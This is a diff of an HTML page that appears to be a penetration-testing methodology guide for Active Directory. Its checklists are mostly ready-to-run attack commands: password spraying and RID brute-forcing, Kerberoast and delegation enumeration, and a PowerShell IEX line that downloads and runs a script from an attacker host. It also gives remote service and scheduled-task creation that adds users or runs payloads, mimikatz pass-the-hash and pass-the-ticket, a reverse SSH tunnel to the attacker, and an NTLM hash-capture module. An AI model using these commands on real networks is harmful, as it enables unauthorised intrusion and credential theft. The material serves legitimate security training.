@@ -241,70 +241,70 @@ enumprivs               # user privileges</code></pre>
 <p>Once a user list is built, spray a candidate password across every account. Lockout policies (from <code>getuserdompwinfo</code>) tell you how aggressive you can be:</p>
 <pre><code class="language-bash">crackmapexec smb <dc-ip> -u users.txt -p "password"</code></pre>
 
-<h3 id="cape-ldap-methodology">1.7 Methodology</h3>
+<h4 id="cape-ldap-methodology">Methodology</h4>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-ldap-methodology-wf-0"> Query the root DSE for <code>namingcontexts</code> to learn the domain DN:
-<pre><code class="language-bash">ldapsearch -x -H ldap://&lt;DC&gt; -s base namingcontexts</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-ldap-methodology-wf-1"> Attempt an anonymous bind and record what returns:
-<pre><code class="language-bash">ldapsearch -x -b "dc=&lt;domain&gt;,dc=&lt;tld&gt;" -h &lt;dc-ip&gt; -p 389</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-ldap-methodology-wf-2"> If anonymous fails, rebind with a domain account:
-<pre><code class="language-bash">ldapsearch -H ldap://&lt;dc-fqdn&gt; -x -D '&lt;user&gt;@&lt;domain.local&gt;' -w '&lt;password&gt;' -b "DC=&lt;domain&gt;,DC=&lt;tld&gt;" "objectclass=user"</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-ldap-methodology-wf-3"> Enumerate <code>objectClass=user</code>, <code>group</code>, <code>computer</code>, and any custom classes discovered.</li>
-<li><input type="checkbox" data-id="cape-ldap-methodology-wf-4"> Extract <code>sAMAccountName</code>, <code>servicePrincipalName</code>, <code>memberOf</code>, <code>userAccountControl</code>, and <code>msDS-*</code> attributes.</li>
-<li><input type="checkbox" data-id="cape-ldap-methodology-wf-4a"> Enumerate Kerberoastable accounts (user accounts with any SPN set):
-<pre><code class="language-bash">ldapsearch -x -b "dc=&lt;domain&gt;,dc=&lt;tld&gt;" -h &lt;dc-ip&gt; \
+  <li><input type="checkbox" data-id="cape-ldap-methodology-wf-0"> Query the root DSE for <code>namingcontexts</code> to learn the domain DN:
+    <pre><code class="language-bash">ldapsearch -x -H ldap://&lt;DC&gt; -s base namingcontexts</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-ldap-methodology-wf-1"> Attempt an anonymous bind and record what returns:
+    <pre><code class="language-bash">ldapsearch -x -b "dc=&lt;domain&gt;,dc=&lt;tld&gt;" -h &lt;dc-ip&gt; -p 389</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-ldap-methodology-wf-2"> If anonymous fails, rebind with a domain account:
+    <pre><code class="language-bash">ldapsearch -H ldap://&lt;dc-fqdn&gt; -x -D '&lt;user&gt;@&lt;domain.local&gt;' -w '&lt;password&gt;' -b "DC=&lt;domain&gt;,DC=&lt;tld&gt;" "objectclass=user"</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-ldap-methodology-wf-3"> Enumerate <code>objectClass=user</code>, <code>group</code>, <code>computer</code>, and any custom classes discovered.</li>
+  <li><input type="checkbox" data-id="cape-ldap-methodology-wf-4"> Extract <code>sAMAccountName</code>, <code>servicePrincipalName</code>, <code>memberOf</code>, <code>userAccountControl</code>, and <code>msDS-*</code> attributes.</li>
+  <li><input type="checkbox" data-id="cape-ldap-methodology-wf-4a"> Enumerate Kerberoastable accounts (user accounts with any SPN set):
+    <pre><code class="language-bash">ldapsearch -x -b "dc=&lt;domain&gt;,dc=&lt;tld&gt;" -h &lt;dc-ip&gt; \
   '(&amp;(samAccountType=805306368)(servicePrincipalName=*))' \
   sAMAccountName servicePrincipalName</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-ldap-methodology-wf-4b"> List accounts with pre-authentication disabled (AS-REP roastable):
-<pre><code class="language-bash">ldapsearch -x -b "dc=&lt;domain&gt;,dc=&lt;tld&gt;" -h &lt;dc-ip&gt; \
+  </li>
+  <li><input type="checkbox" data-id="cape-ldap-methodology-wf-4b"> List accounts with pre-authentication disabled (AS-REP roastable):
+    <pre><code class="language-bash">ldapsearch -x -b "dc=&lt;domain&gt;,dc=&lt;tld&gt;" -h &lt;dc-ip&gt; \
   '(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' \
   sAMAccountName</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-ldap-methodology-wf-4c"> Find computers with unconstrained delegation:
-<pre><code class="language-bash">ldapsearch -x -b "dc=&lt;domain&gt;,dc=&lt;tld&gt;" -h &lt;dc-ip&gt; \
+  </li>
+  <li><input type="checkbox" data-id="cape-ldap-methodology-wf-4c"> Find computers with unconstrained delegation:
+    <pre><code class="language-bash">ldapsearch -x -b "dc=&lt;domain&gt;,dc=&lt;tld&gt;" -h &lt;dc-ip&gt; \
   '(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))' \
   sAMAccountName dNSHostName</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-ldap-methodology-wf-4d"> Find accounts configured for constrained delegation (<code>msDS-AllowedToDelegateTo</code> populated):
-<pre><code class="language-bash">ldapsearch -x -b "dc=&lt;domain&gt;,dc=&lt;tld&gt;" -h &lt;dc-ip&gt; \
+  </li>
+  <li><input type="checkbox" data-id="cape-ldap-methodology-wf-4d"> Find accounts configured for constrained delegation (<code>msDS-AllowedToDelegateTo</code> populated):
+    <pre><code class="language-bash">ldapsearch -x -b "dc=&lt;domain&gt;,dc=&lt;tld&gt;" -h &lt;dc-ip&gt; \
   '(msDS-AllowedToDelegateTo=*)' \
   sAMAccountName msDS-AllowedToDelegateTo</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-ldap-methodology-wf-4e"> Identify Resource-Based Constrained Delegation targets (<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> populated):
-<pre><code class="language-bash">ldapsearch -x -b "dc=&lt;domain&gt;,dc=&lt;tld&gt;" -h &lt;dc-ip&gt; \
+  </li>
+  <li><input type="checkbox" data-id="cape-ldap-methodology-wf-4e"> Identify Resource-Based Constrained Delegation targets (<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> populated):
+    <pre><code class="language-bash">ldapsearch -x -b "dc=&lt;domain&gt;,dc=&lt;tld&gt;" -h &lt;dc-ip&gt; \
   '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)' \
   sAMAccountName msDS-AllowedToActOnBehalfOfOtherIdentity</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-ldap-methodology-wf-4f"> Flag accounts where password never expires (long-lived credential candidates):
-<pre><code class="language-bash">ldapsearch -x -b "dc=&lt;domain&gt;,dc=&lt;tld&gt;" -h &lt;dc-ip&gt; \
+  </li>
+  <li><input type="checkbox" data-id="cape-ldap-methodology-wf-4f"> Flag accounts where password never expires (long-lived credential candidates):
+    <pre><code class="language-bash">ldapsearch -x -b "dc=&lt;domain&gt;,dc=&lt;tld&gt;" -h &lt;dc-ip&gt; \
   '(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=65536))' \
   sAMAccountName</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-ldap-methodology-wf-4g"> Walk transitive Domain Admins membership with <code>LDAP_MATCHING_RULE_IN_CHAIN</code>:
-<pre><code class="language-bash">ldapsearch -x -b "dc=&lt;domain&gt;,dc=&lt;tld&gt;" -h &lt;dc-ip&gt; \
+  </li>
+  <li><input type="checkbox" data-id="cape-ldap-methodology-wf-4g"> Walk transitive Domain Admins membership with <code>LDAP_MATCHING_RULE_IN_CHAIN</code>:
+    <pre><code class="language-bash">ldapsearch -x -b "dc=&lt;domain&gt;,dc=&lt;tld&gt;" -h &lt;dc-ip&gt; \
   '(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=&lt;domain&gt;,DC=&lt;tld&gt;)' \
   sAMAccountName</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-ldap-methodology-wf-4h"> Filter to enabled users only before feeding any list into a spray:
-<pre><code class="language-bash">ldapsearch -x -b "dc=&lt;domain&gt;,dc=&lt;tld&gt;" -h &lt;dc-ip&gt; \
+  </li>
+  <li><input type="checkbox" data-id="cape-ldap-methodology-wf-4h"> Filter to enabled users only before feeding any list into a spray:
+    <pre><code class="language-bash">ldapsearch -x -b "dc=&lt;domain&gt;,dc=&lt;tld&gt;" -h &lt;dc-ip&gt; \
   '(&amp;(samAccountType=805306368)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' \
   sAMAccountName</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-ldap-methodology-wf-5"> Fall back to <code>rpcclient</code> over MSRPC when LDAP is filtered:
-<pre><code class="language-bash">rpcclient -U="" -N &lt;dc-ip&gt;
+  </li>
+  <li><input type="checkbox" data-id="cape-ldap-methodology-wf-5"> Fall back to <code>rpcclient</code> over MSRPC when LDAP is filtered:
+    <pre><code class="language-bash">rpcclient -U="" -N &lt;dc-ip&gt;
 rpcclient $&gt; enumdomusers
 rpcclient $&gt; querydispinfo</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-ldap-methodology-wf-6"> RID-brute via SAMR when username enumeration is blocked:
-<pre><code class="language-bash">crackmapexec smb &lt;dc&gt; -u "" -p "" --rid-brute</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-ldap-methodology-wf-7"> Feed the resulting user list into a password spray, respecting lockout:
-<pre><code class="language-bash">crackmapexec smb &lt;dc&gt; -u users.txt -p '<password>'</code></pre>
-</li>
+  </li>
+  <li><input type="checkbox" data-id="cape-ldap-methodology-wf-6"> RID-brute via SAMR when username enumeration is blocked:
+    <pre><code class="language-bash">crackmapexec smb &lt;dc&gt; -u "" -p "" --rid-brute</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-ldap-methodology-wf-7"> Feed the resulting user list into a password spray, respecting lockout:
+    <pre><code class="language-bash">crackmapexec smb &lt;dc&gt; -u users.txt -p '<password>'</code></pre>
+  </li>
 </ul>
 <h2 id="cape-powerview-2">2. Active Directory PowerView</h2>
 <p>PowerView is the PowerShell recon module bundled with PowerSploit. It has been formally deprecated for a few years now, but nothing in the wider tooling stack covers the same ground as cleanly: LDAP-backed queries, ACL analysis, and delegation checks in one script that runs anywhere a domain user has a shell. Reading its cmdlets is also one of the fastest ways to internalise what raw LDAP filters look like under the hood.</p>
@@ -547,22 +547,22 @@ $DomainUsers = Import-Clixml .\DomainUsers.xml
 $DomainUsers | select name
 $DomainUsers | ? {$_.name -match "admin"}</code></pre>
 
-<h3 id="cape-powerview-methodology">2.16 Methodology</h3>
+<h4 id="cape-powerview-methodology">Methodology</h4>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-powerview-methodology-wf-0"> Load PowerView in-memory via <code>IEX</code> to avoid on-disk artifacts:
-<pre><code class="language-powershell">IEX (New-Object Net.WebClient).DownloadString('http://&lt;attacker&gt;/PowerView.ps1')</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-powerview-methodology-wf-1"> Snapshot the environment:
-<pre><code class="language-powershell">Get-NetDomain
+  <li><input type="checkbox" data-id="cape-powerview-methodology-wf-0"> Load PowerView in-memory via <code>IEX</code> to avoid on-disk artifacts:
+    <pre><code class="language-powershell">IEX (New-Object Net.WebClient).DownloadString('http://&lt;attacker&gt;/PowerView.ps1')</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-powerview-methodology-wf-1"> Snapshot the environment:
+    <pre><code class="language-powershell">Get-NetDomain
 Get-NetDomainController
 Get-NetForest</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-powerview-methodology-wf-2"> Enumerate accounts and groups you're a member of:
-<pre><code class="language-powershell">Get-ADUser -Filter *
+  </li>
+  <li><input type="checkbox" data-id="cape-powerview-methodology-wf-2"> Enumerate accounts and groups you're a member of:
+    <pre><code class="language-powershell">Get-ADUser -Filter *
 Get-NetGroup | Where-Object { $_.member -match $env:USERNAME }</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-powerview-methodology-wf-3"> Hunt sessions and locate admins currently logged in:
-<pre><code class="language-powershell"># SMB sessions on one target host
+  </li>
+  <li><input type="checkbox" data-id="cape-powerview-methodology-wf-3"> Hunt sessions and locate admins currently logged in:
+    <pre><code class="language-powershell"># SMB sessions on one target host
 Get-NetSession -ComputerName &lt;target&gt;
 
 # Every host with an active session for a member of Domain Admins
@@ -570,9 +570,9 @@ Find-DomainUserLocation -UserGroupIdentity 'Domain Admins'
 
 # Every host where my current credential is already local admin
 Find-LocalAdminAccess</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-powerview-methodology-wf-4"> Enumerate Kerberoastable SPNs and pull tickets directly:
-<pre><code class="language-powershell"># Enumerate, list every user account with an SPN set
+  </li>
+  <li><input type="checkbox" data-id="cape-powerview-methodology-wf-4"> Enumerate Kerberoastable SPNs and pull tickets directly:
+    <pre><code class="language-powershell"># Enumerate, list every user account with an SPN set
 Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname
 
 # Roast, request the TGS for each SPN and write hashcat-ready output
@@ -580,13 +580,13 @@ Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat | Export-Csv .\k
 
 # Older one-shot wrapper for the same enumerate-and-roast flow
 Invoke-Kerberoast -OutputFormat Hashcat | Export-Csv .\kerb.csv -NoTypeInformation</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-powerview-methodology-wf-4a"> Enumerate AS-REP roastable accounts (pre-auth disabled):
-<pre><code class="language-powershell"># DONT_REQ_PREAUTH bit (4194304) on userAccountControl
+  </li>
+  <li><input type="checkbox" data-id="cape-powerview-methodology-wf-4a"> Enumerate AS-REP roastable accounts (pre-auth disabled):
+    <pre><code class="language-powershell"># DONT_REQ_PREAUTH bit (4194304) on userAccountControl
 Get-DomainUser -PreauthNotRequired -Properties samaccountname, distinguishedname, useraccountcontrol</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-powerview-methodology-wf-4b"> Map every delegation misconfiguration:
-<pre><code class="language-powershell"># Unconstrained delegation on computers (TRUSTED_FOR_DELEGATION bit)
+  </li>
+  <li><input type="checkbox" data-id="cape-powerview-methodology-wf-4b"> Map every delegation misconfiguration:
+    <pre><code class="language-powershell"># Unconstrained delegation on computers (TRUSTED_FOR_DELEGATION bit)
 Get-DomainComputer -Unconstrained -Properties samaccountname, dnshostname
 
 # Constrained delegation on user (service) accounts
@@ -598,9 +598,9 @@ Get-DomainComputer -TrustedToAuth -Properties samaccountname, msds-allowedtodele
 # Resource-based constrained delegation, the target lists who may act on its behalf
 Get-DomainComputer -Properties samaccountname, msds-allowedtoactonbehalfofotheridentity |
   Where-Object { $_.'msds-allowedtoactonbehalfofotheridentity' }</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-powerview-methodology-wf-4c"> Enumerate ACLs on high-value targets and hunt for abusable ACEs:
-<pre><code class="language-powershell"># Every ACE against one named target
+  </li>
+  <li><input type="checkbox" data-id="cape-powerview-methodology-wf-4c"> Enumerate ACLs on high-value targets and hunt for abusable ACEs:
+    <pre><code class="language-powershell"># Every ACE against one named target
 Get-DomainObjectAcl -Identity &lt;target-user&gt; -ResolveGUIDs
 
 # Full-control equivalents across the domain (any of the four writeable rights)
@@ -610,9 +610,9 @@ Get-DomainObjectAcl -ResolveGUIDs |
 # Password-reset rights over any principal (ForceChangePassword)
 Get-DomainObjectAcl -ResolveGUIDs |
   Where-Object { $_.ObjectAceType -eq 'User-Force-Change-Password' }</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-powerview-methodology-wf-4d"> Walk every reachable trust and enumerate the far side:
-<pre><code class="language-powershell"># Direct trusts of the current domain
+  </li>
+  <li><input type="checkbox" data-id="cape-powerview-methodology-wf-4d"> Walk every reachable trust and enumerate the far side:
+    <pre><code class="language-powershell"># Direct trusts of the current domain
 Get-DomainTrust
 
 # Forest-level trusts (includes cross-forest)
@@ -623,9 +623,9 @@ Get-DomainTrustMapping
 
 # Query users in a trusted domain rather than the current one
 Get-DomainUser -Domain &lt;trusted-domain.local&gt; -Properties samaccountname, memberof</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-powerview-methodology-wf-4e"> Enumerate OUs and their linked GPOs, including any local-admin assignments:
-<pre><code class="language-powershell"># All OUs, names and distinguished names
+  </li>
+  <li><input type="checkbox" data-id="cape-powerview-methodology-wf-4e"> Enumerate OUs and their linked GPOs, including any local-admin assignments:
+    <pre><code class="language-powershell"># All OUs, names and distinguished names
 Get-DomainOU -Properties name, distinguishedname
 
 # All GPOs plus their SYSVOL paths (where the actual policy files live)
@@ -633,14 +633,14 @@ Get-DomainGPO -Properties displayname, gpcfilesyspath
 
 # GPOs that push local group membership (Restricted Groups policy)
 Get-DomainGPOLocalGroup -Properties GroupName, GPODisplayName</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-powerview-methodology-wf-5"> Fall back to <code>DirectorySearcher</code> or <code>dsquery</code> when PowerView cmdlets are blocked:
-<pre><code class="language-bash">dsquery user -limit 0
+  </li>
+  <li><input type="checkbox" data-id="cape-powerview-methodology-wf-5"> Fall back to <code>DirectorySearcher</code> or <code>dsquery</code> when PowerView cmdlets are blocked:
+    <pre><code class="language-bash">dsquery user -limit 0
 dsquery group "cn=users, dc=target, dc=com"</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-powerview-methodology-wf-6"> Export the results with <code>Export-Clixml</code> so subsequent analysis works offline:
-<pre><code class="language-powershell">Get-DomainUser | Export-Clixml .\DomainUsers.xml</code></pre>
-</li>
+  </li>
+  <li><input type="checkbox" data-id="cape-powerview-methodology-wf-6"> Export the results with <code>Export-Clixml</code> so subsequent analysis works offline:
+    <pre><code class="language-powershell">Get-DomainUser | Export-Clixml .\DomainUsers.xml</code></pre>
+  </li>
 </ul>
 <h2 id="cape-bloodhound-3">3. Active Directory BloodHound</h2>
 <p>BloodHound converts the AD relationship graph into something you can actually query. Under the hood it is Neo4j; on top of that sits a client that ships pre-built Cypher queries for the questions attackers actually ask, starting with "what is the shortest path from here to Domain Admin?". That single query has quietly ended more assessments than any zero-day I have ever handled.</p>
@@ -973,27 +973,27 @@ RETURN p
 MATCH p=shortestPath((u:User)-[:ADCSESC1*1..]-&gt;(t {highvalue:true}))
 RETURN p</code></pre>
 
-<h3 id="cape-bloodhound-methodology">3.28 Methodology</h3>
+<h4 id="cape-bloodhound-methodology">Methodology</h4>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-bloodhound-methodology-wf-0"> Stand up Neo4j and BloodHound CE with matching version numbers:
-<pre><code class="language-bash">sudo systemctl start neo4j
+  <li><input type="checkbox" data-id="cape-bloodhound-methodology-wf-0"> Stand up Neo4j and BloodHound CE with matching version numbers:
+    <pre><code class="language-bash">sudo systemctl start neo4j
 bloodhound</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-bloodhound-methodology-wf-1"> Run SharpHound with <code>--CollectionMethods All</code>; add <code>--Stealth</code> if EDR is aggressive:
-<pre><code class="language-bash">SharpHound.exe --CollectionMethods All --Domain <domain.local> --ZipFileName loot.zip
+  </li>
+  <li><input type="checkbox" data-id="cape-bloodhound-methodology-wf-1"> Run SharpHound with <code>--CollectionMethods All</code>; add <code>--Stealth</code> if EDR is aggressive:
+    <pre><code class="language-bash">SharpHound.exe --CollectionMethods All --Domain <domain.local> --ZipFileName loot.zip
 SharpHound.exe --CollectionMethods All --Stealth --ExcludeDomainControllers</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-bloodhound-methodology-wf-2"> Ingest the ZIP into BloodHound and mark starter nodes as owned.</li>
-<li><input type="checkbox" data-id="cape-bloodhound-methodology-wf-3"> Run "Shortest Paths to Domain Admins" and "Shortest Paths from Owned to Domain Admins":
-<pre><code class="language-bash">MATCH p=shortestPath((n {owned:true})-[*1..]-&gt;(m:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-bloodhound-methodology-wf-4"> Enumerate ACL edges, GenericAll, GenericWrite, WriteDACL, WriteOwner, ForceChangePassword, AddMembers, AllExtendedRights.</li>
-<li><input type="checkbox" data-id="cape-bloodhound-methodology-wf-5"> Identify unconstrained delegation hosts and Kerberos-abuseable service accounts:
-<pre><code class="language-bash">MATCH (c:Computer {unconstraineddelegation:true}) RETURN c</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-bloodhound-methodology-wf-6"> Chain the shortest confirmed path, verifying each edge with BloodyAD, PowerView, or Impacket before proceeding:
-<pre><code class="language-bash">bloodyAD --host &lt;dc&gt; -d domain.local -u user -p pass add groupMember 'CN=Target,CN=Users,DC=domain,DC=local' &lt;user&gt;</code></pre>
-</li>
+  </li>
+  <li><input type="checkbox" data-id="cape-bloodhound-methodology-wf-2"> Ingest the ZIP into BloodHound and mark starter nodes as owned.</li>
+  <li><input type="checkbox" data-id="cape-bloodhound-methodology-wf-3"> Run "Shortest Paths to Domain Admins" and "Shortest Paths from Owned to Domain Admins":
+    <pre><code class="language-bash">MATCH p=shortestPath((n {owned:true})-[*1..]-&gt;(m:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-bloodhound-methodology-wf-4"> Enumerate ACL edges, GenericAll, GenericWrite, WriteDACL, WriteOwner, ForceChangePassword, AddMembers, AllExtendedRights.</li>
+  <li><input type="checkbox" data-id="cape-bloodhound-methodology-wf-5"> Identify unconstrained delegation hosts and Kerberos-abuseable service accounts:
+    <pre><code class="language-bash">MATCH (c:Computer {unconstraineddelegation:true}) RETURN c</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-bloodhound-methodology-wf-6"> Chain the shortest confirmed path, verifying each edge with BloodyAD, PowerView, or Impacket before proceeding:
+    <pre><code class="language-bash">bloodyAD --host &lt;dc&gt; -d domain.local -u user -p pass add groupMember 'CN=Target,CN=Users,DC=domain,DC=local' &lt;user&gt;</code></pre>
+  </li>
 </ul>
 <h2 id="cape-lateral-movement-4">4. Windows Lateral Movement</h2>
 <p>Lateral movement is what happens between the first foothold and the objective. Every technique here trades stealth for reliability along a slightly different axis; the right one to pick depends on the sensor stack in the environment, whether logging is centralised, and whether the account you plan to reuse is expected to appear on the destination host at all.</p>
@@ -1253,43 +1253,43 @@ socks4  127.0.0.1 9050</code></pre>
 <pre><code class="language-bash">proxychains curl http://<domain.local></code></pre>
 <p>nmap through SOCKS is unreliable in some situations, mileage varies.</p>
 
-<h3 id="cape-lateral-methodology">4.13 Methodology</h3>
+<h4 id="cape-lateral-methodology">Methodology</h4>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-lateral-methodology-wf-0"> Enumerate reachable hosts and services from the foothold:
-<pre><code class="language-powershell">Get-NetSession -ComputerName &lt;target&gt;
+  <li><input type="checkbox" data-id="cape-lateral-methodology-wf-0"> Enumerate reachable hosts and services from the foothold:
+    <pre><code class="language-powershell">Get-NetSession -ComputerName &lt;target&gt;
 Test-NetConnection &lt;host&gt; -Port 5985</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-lateral-methodology-wf-1"> Pick a lateral movement technique consistent with your access level (admin, local, remote WinRM).</li>
-<li><input type="checkbox" data-id="cape-lateral-methodology-wf-2"> Prefer WinRM/PSRemoting for stealth:
-<pre><code class="language-powershell">$cred = New-Object System.Management.Automation.PSCredential('DOMAIN\user', (ConvertTo-SecureString 'pass' -AsPlainText -Force))
+  </li>
+  <li><input type="checkbox" data-id="cape-lateral-methodology-wf-1"> Pick a lateral movement technique consistent with your access level (admin, local, remote WinRM).</li>
+  <li><input type="checkbox" data-id="cape-lateral-methodology-wf-2"> Prefer WinRM/PSRemoting for stealth:
+    <pre><code class="language-powershell">$cred = New-Object System.Management.Automation.PSCredential('DOMAIN\user', (ConvertTo-SecureString 'pass' -AsPlainText -Force))
 Invoke-Command -ComputerName &lt;target&gt; -Credential $cred -ScriptBlock { whoami }</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-lateral-methodology-wf-3"> Use WMI when WinRM is blocked:
-<pre><code class="language-powershell">$Opt = New-CimSessionOption -Protocol DCOM
+  </li>
+  <li><input type="checkbox" data-id="cape-lateral-methodology-wf-3"> Use WMI when WinRM is blocked:
+    <pre><code class="language-powershell">$Opt = New-CimSessionOption -Protocol DCOM
 $Session = New-CimSession -ComputerName &lt;target&gt; -Credential $cred -SessionOption $Opt
 Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = "cmd.exe /c calc.exe" }</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-lateral-methodology-wf-4"> Fall back to sc.exe/schtasks when neither WinRM nor WMI works:
-<pre><code class="language-bash">sc.exe \\TARGET create evil binPath= "net user u1 P@ss1 /add" start= auto
+  </li>
+  <li><input type="checkbox" data-id="cape-lateral-methodology-wf-4"> Fall back to sc.exe/schtasks when neither WinRM nor WMI works:
+    <pre><code class="language-bash">sc.exe \\TARGET create evil binPath= "net user u1 P@ss1 /add" start= auto
 schtasks /s TARGET /RU "SYSTEM" /create /tn "evil" /tr "&lt;payload&gt;" /sc ONCE /sd 01/01/1970 /st 00:00</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-lateral-methodology-wf-5"> Where NTLM is permitted, use PtH:
-<pre><code class="language-bash">mimikatz # sekurlsa::pth /user:Administrator /domain:<domain.local> /ntlm:&lt;hash&gt; /run:cmd.exe</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-lateral-methodology-wf-6"> Where Kerberos-only, use PtK/OPtH or PtT:
-<pre><code class="language-bash">mimikatz # sekurlsa::pth /user:Administrator /domain:<domain.local> /aes256:&lt;aes256&gt; /run:cmd.exe
+  </li>
+  <li><input type="checkbox" data-id="cape-lateral-methodology-wf-5"> Where NTLM is permitted, use PtH:
+    <pre><code class="language-bash">mimikatz # sekurlsa::pth /user:Administrator /domain:<domain.local> /ntlm:&lt;hash&gt; /run:cmd.exe</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-lateral-methodology-wf-6"> Where Kerberos-only, use PtK/OPtH or PtT:
+    <pre><code class="language-bash">mimikatz # sekurlsa::pth /user:Administrator /domain:<domain.local> /aes256:&lt;aes256&gt; /run:cmd.exe
 mimikatz # kerberos::ptt ticket.kirbi</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-lateral-methodology-wf-7"> Establish a persistent SOCKS tunnel once a pivot is confirmed:
-<pre><code class="language-bash">ssh tunneluser@&lt;attacker&gt; -R 9050 -N
+  </li>
+  <li><input type="checkbox" data-id="cape-lateral-methodology-wf-7"> Establish a persistent SOCKS tunnel once a pivot is confirmed:
+    <pre><code class="language-bash">ssh tunneluser@&lt;attacker&gt; -R 9050 -N
 proxychains &lt;tool&gt;</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-lateral-methodology-wf-8"> Clean up (delete services, unregister tasks, remove PSSessions), every artifact left is an IR lead:
-<pre><code class="language-bash">sc.exe \\TARGET stop evil
+  </li>
+  <li><input type="checkbox" data-id="cape-lateral-methodology-wf-8"> Clean up (delete services, unregister tasks, remove PSSessions), every artifact left is an IR lead:
+    <pre><code class="language-bash">sc.exe \\TARGET stop evil
 sc.exe \\TARGET delete evil
 schtasks /S TARGET /TN "evil" /DELETE /F
 Remove-PSSession $sess</code></pre>
-</li>
+  </li>
 </ul>
 <h2 id="cape-crackmapexec-5">5. Using CrackMapExec</h2>
 <p>CrackMapExec (CME), and its actively maintained fork NetExec (<code>nxc</code>), pack the most-used AD attack surfaces behind a single fast multi-target CLI. SMB, MSSQL, WinRM, LDAP, and RDP all live under the same tool. Where PowerView is what I reach for during enumeration and Impacket is what I use for surgical single-target work, CME is what I sweep a segment with when I need to know, in under a minute, which hosts are reachable, what signing looks like, and whose credentials still work.</p>
@@ -1479,26 +1479,26 @@ crackmapexec ldap &lt;dc-fqdn&gt; -u &lt;user&gt; -k --use-kcache --users</code>
 <pre><code class="language-bash">sudo responder -I eth0 -dpV</code></pre>
 <p>The typical CME + Responder flow: run CME to plant slinky, wait for a user to browse the share, capture the hash, crack offline.</p>
 
-<h3 id="cape-cme-methodology">5.9 Methodology</h3>
+<h4 id="cape-cme-methodology">Methodology</h4>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-cme-methodology-wf-0"> Sweep the target subnet with SMB to identify hosts, OS versions, and signing status:
-<pre><code class="language-bash">crackmapexec smb <subnet></code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-cme-methodology-wf-1"> Spray any known passwords, respecting lockout:
-<pre><code class="language-bash">crackmapexec smb <subnet> -u users.txt -p '<password>' --continue-on-success</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-cme-methodology-wf-2"> Try anonymous RID brute-force against DCs to build a user list from scratch:
-<pre><code class="language-bash">crackmapexec smb &lt;DC&gt; -u "" -p "" --rid-brute</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-cme-methodology-wf-3"> Once creds are confirmed, layer NetExec modules to extract further value:
-<pre><code class="language-bash">netexec smb &lt;target&gt; -u &lt;u&gt; -p &lt;p&gt; -M slinky -o NAME=share SERVER=&lt;attacker&gt;
+  <li><input type="checkbox" data-id="cape-cme-methodology-wf-0"> Sweep the target subnet with SMB to identify hosts, OS versions, and signing status:
+    <pre><code class="language-bash">crackmapexec smb <subnet></code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-cme-methodology-wf-1"> Spray any known passwords, respecting lockout:
+    <pre><code class="language-bash">crackmapexec smb <subnet> -u users.txt -p '<password>' --continue-on-success</code></pre>
+  </li>
+  <li><input type="checkbox" data-id="cape-cme-methodology-wf-2"> Try anonymous RID brute-force against DCs to build a user list from scratch:
